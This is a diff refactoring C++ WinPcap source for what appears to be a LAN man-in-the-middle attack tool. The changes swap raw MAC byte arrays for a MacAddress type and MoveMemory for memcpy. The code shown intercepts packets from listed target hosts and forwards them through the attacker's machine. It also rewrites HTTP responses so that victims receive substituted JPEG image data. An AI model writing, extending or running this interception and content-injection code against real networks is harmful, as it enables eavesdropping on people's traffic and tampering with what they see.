@@ -9,13 +9,13 @@ volatile BOOL g_attacking = FALSE;
 pcap_if_t* g_deviceList = NULL;
 pcap_if_t* g_adapter = NULL;
 DWORD g_selfIp = 0;
-BYTE g_selfMac[6] = {};
+MacAddress g_selfMac;
 DWORD g_selfGateway = 0;
-BYTE g_gatewayMac[6] = {};
+MacAddress g_gatewayMac;
 
 map<DWORD, HostInfoSetting> g_host;
 map<DWORD, HostInfoSetting*> g_attackList;
-map<DWORD64, HostInfoSetting*> g_attackListMac;
+map<MacAddress, HostInfoSetting*> g_attackListMac;
 CCriticalSection g_hostAttackListLock;
 
 
@@ -54,11 +54,6 @@ void SetFilter(pcap_t* adapter, LPCSTR exp)
 	pcap_setfilter(adapter, &fcode);
 }
 
-DWORD64 BMacToDw64(const BYTE* mac)
-{
-	return *(DWORD64*)mac & 0x0000FFFFFFFFFFFFLL;
-}
-
 /////////////////////////////////////////////////////////////////////////////////////////
 
 // param : { ip, port }
@@ -89,9 +84,9 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 #pragma region
 	{
 	BYTE* ackPkt = new BYTE[ETH_LENGTH + ipLen + tcpLen];
-	MoveMemory(ackPkt, g_gatewayMac, 6);
-	MoveMemory(ackPkt + 6, g_selfMac, 6);
-	MoveMemory(ackPkt + 12, link.initPacket + 12, 2 + ipLen + tcpLen);
+	*(MacAddress*)ackPkt = g_gatewayMac;
+	*(MacAddress*)(ackPkt + 6) = g_selfMac;
+	memcpy(ackPkt + 12, link.initPacket + 12, 2 + ipLen + tcpLen);
 	IPPacket* pPktIp = (IPPacket*)(ackPkt + ETH_LENGTH);
 	pPktIp->identification = htons(ntohs(pPktIp->identification) + 1);
 	pPktIp->totalLen = htons((WORD)(ipLen + tcpLen));
@@ -153,8 +148,8 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	LPCSTR pContentLen = strstr(pHttp, "Content-Length: ") + strlen("Content-Length: ");
 	DWORD httpHeaderLen = strstr(pHttp, "\r\n\r\n") + strlen("\r\n\r\n") - pHttp;
 
-	MoveMemory(sendBuf, target.mac, 6);					// destination MAC
-	MoveMemory(sendBuf + 6, g_selfMac, 6);				// source MAC
+	*(MacAddress*)sendBuf = target.mac;					// destination MAC
+	*(MacAddress*)(sendBuf + 6) = g_selfMac;			// source MAC
 
 	BYTE* p1 = sendBuf + 12;
 	const BYTE* p2 = link.initPacket + 12;
@@ -162,15 +157,15 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	if (pContentType < pContentLen)
 	{
 		len = 2 + ipLen + tcpLen + (pContentType - pHttp);
-		MoveMemory(p1, p2, len);							// data
+		memcpy(p1, p2, len);							// data
 		p1 += len; p2 += len;
 
 		len = strlen("Content-Type: image/jpeg");
-		MoveMemory(p1, "Content-Type: image/jpeg", len);	// content type
+		memcpy(p1, "Content-Type: image/jpeg", len);	// content type
 		p1 += len; p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
 
 		len = (BYTE*)pContentLen - p2;
-		MoveMemory(p1, p2, len);							// data
+		memcpy(p1, p2, len);							// data
 		p1 += len; p2 += len;
 
 		_itoa_s(target.imageDataLen, (LPSTR)p1, 15, 10);	// content length
@@ -179,23 +174,23 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	else
 	{
 		len = 2 + ipLen + tcpLen + (pContentLen - pHttp);
-		MoveMemory(p1, p2, len);							// data
+		memcpy(p1, p2, len);							// data
 		p1 += len; p2 += len;
 
 		_itoa_s(target.imageDataLen, (LPSTR)p1, 15, 10);	// content length
 		for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
 
 		len = (BYTE*)pContentType - p2;
-		MoveMemory(p1, p2, len);							// data
+		memcpy(p1, p2, len);							// data
 		p1 += len; p2 += len;
 
 		len = strlen("Content-Type: image/jpeg");
-		MoveMemory(p1, "Content-Type: image/jpeg", len);	// content type
+		memcpy(p1, "Content-Type: image/jpeg", len);	// content type
 		p1 += len; p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
 	}
 
 	len = (BYTE*)pHttp + httpHeaderLen - p2;
-	MoveMemory(p1, p2, len);								// data
+	memcpy(p1, p2, len);								// data
 	p1 += len;
 
 
@@ -225,7 +220,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 			target.imageDataLock.Unlock();
 			goto End;
 		}
-		MoveMemory(pTcpData, &target.imageData[start], maxTcpDataLen);
+		memcpy(pTcpData, &target.imageData[start], maxTcpDataLen);
 		target.imageDataLock.Unlock();
 		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
 		pcap_sendpacket(adapter, (u_char*)sendBuf, sendBufLen);
@@ -240,7 +235,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 		target.imageDataLock.Unlock();
 		goto End;
 	}
-	MoveMemory(pTcpData, &target.imageData[start], lastTcpDataLen);
+	memcpy(pTcpData, &target.imageData[start], lastTcpDataLen);
 	target.imageDataLock.Unlock();
 	pIp->totalLen = htons((u_short)(ipLen + tcpLen + lastTcpDataLen));				// IP total length
 	pIp->CalcCheckSum();															// IP checksum
@@ -282,7 +277,7 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 
 		{
 		g_hostAttackListLock.Lock();
-		auto targetIt = g_attackListMac.find(BMacToDw64(pkt_data + 6));
+		auto targetIt = g_attackListMac.find(*(MacAddress*)(pkt_data + 6));
 		g_hostAttackListLock.Unlock();
 		if (targetIt != g_attackListMac.end()) // is target packet
 #pragma region
@@ -307,9 +302,9 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 				}
 
 				BYTE* newData = new BYTE[header->len];
-				MoveMemory(newData, g_gatewayMac, 6); // destination MAC
-				MoveMemory(newData + 6, g_selfMac, 6); // source MAC
-				MoveMemory(newData + 12, pkt_data + 12, header->len - 12); // data
+				*(MacAddress*)newData = g_gatewayMac; // destination MAC
+				*(MacAddress*)(newData + 6) = g_selfMac; // source MAC
+				memcpy(newData + 12, pkt_data + 12, header->len - 12); // data
 				pcap_sendpacket(adapter, (u_char*)newData, header->len);
 				delete newData;
 			}
@@ -318,7 +313,7 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 #pragma endregion
 		}
 
-		if (memcmp(pkt_data + 6, g_gatewayMac, 6) == 0 // is gateway packet
+		if (*(MacAddress*)(pkt_data + 6) == g_gatewayMac // is gateway packet
 			&& *(WORD*)&pkt_data[12] == PROTOCOL_IP) // IP
 #pragma region
 		{
@@ -367,7 +362,7 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 			link.sourcePort = pTcp->sourcePort;
 			link.initPacketLen = header->len;
 			link.initPacket = new BYTE[header->len];
-			MoveMemory(link.initPacket, pkt_data, header->len);
+			memcpy(link.initPacket, pkt_data, header->len);
 			DWORD* param = new DWORD[2];
 			param[0] = target.ip;
 			param[1] = pTcp->destinationPort;
@@ -378,9 +373,9 @@ Forward:
 			if (target.forward)
 			{
 				BYTE* newData = new BYTE[header->len];
-				MoveMemory(newData, target.mac, 6); // destination MAC
-				MoveMemory(newData + 6, g_selfMac, 6); // source MAC
-				MoveMemory(newData + 12, pkt_data + 12, header->len - 12); // data
+				*(MacAddress*)newData = target.mac; // destination MAC
+				*(MacAddress*)(newData + 6) = g_selfMac; // source MAC
+				memcpy(newData + 12, pkt_data + 12, header->len - 12); // data
 				pcap_sendpacket(adapter, (u_char*)newData, header->len);
 				delete newData;
 			}
